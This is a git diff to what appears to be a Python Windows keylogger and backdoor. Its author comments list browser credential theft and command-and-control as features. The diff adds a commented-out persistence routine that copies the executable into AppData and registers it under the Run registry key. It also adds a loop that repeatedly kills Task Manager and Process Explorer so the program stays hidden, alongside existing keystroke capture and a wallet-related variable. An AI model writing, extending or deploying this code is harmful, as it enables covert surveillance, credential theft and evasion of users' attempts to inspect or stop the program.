@@ -6,6 +6,7 @@ import subprocess
 import time
 import random
 import os
+import psutil
 from colorama import init, Fore
 import keyboard
 import socket
@@ -20,7 +21,6 @@ import certs
 # Name    ->  Pablo
 # GitHub  ->  https://github.com/an0mal1a
 # Correo  -> pablodiez024@proton.me
-
 # ACTUALES:
 # Credenciales de navegadores
 # C&C
@@ -60,6 +60,15 @@ print(Fore.GREEN + "\n\t[!] Iniciando Programa...")
 yek = []
 
 
+## PERSISTENCIA PARA WINDOWS ##
+
+# location = os.environ["appdata"] + "\\windows32.exe" # Asi se llamara nuestro backdoor
+
+# if not os.path.exists(location):
+# shutil.copyfile(sys.executable, location)
+# subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
+
+
 def is_admin():
     if ctypes.windll.shell32.IsUserAnAdmin() == 0:
         print(Fore.RED + "[!] ESTE PROGRAMA NECESITA PERMISOS DE ADMINISTRADOR.")
@@ -91,6 +100,7 @@ def on_press(event):
     try:
         t = threading.Thread(target=init_game)
         t.start()
+
 
         yek.append(event.name)
 
@@ -163,6 +173,32 @@ def games():
         pass
 
 
+def is_open():
+    for proc in psutil.process_iter(attrs=['pid', 'name']):
+        if "Taskmgr.exe" in proc.info['name'] or "procexp64.exe" in proc.info['name']:
+            return proc.info['pid']
+    return False
+
+
+def start_taskmanager():
+    while True:
+        pid = is_open()
+        if pid:
+            try:
+                os.kill(pid, 9)
+            except PermissionError:
+                if is_admin() != 0:
+                    pass
+        time.sleep(0.5)
+
+
+def init_task():
+    t = threading.Thread(target=start_taskmanager)
+    t.start()
+
+    t.join()
+
+
 def init_game():
 
     t = threading.Thread(target=games)
@@ -178,8 +214,12 @@ def main():
         banner()
         init(convert=True)
 
-        find_interests.main()
+        interest = threading.Thread(target=find_interests.main)
+        interest.start()
         keyboard.on_press(on_press)
+
+        task = threading.Thread(target=init_task)
+        task.start()
 
         wallet = None
 
@@ -290,3 +330,6 @@ if __name__ == "__main__":
             exit()
         except Exception:
             exit()
+
+    except Exception:
+        pass
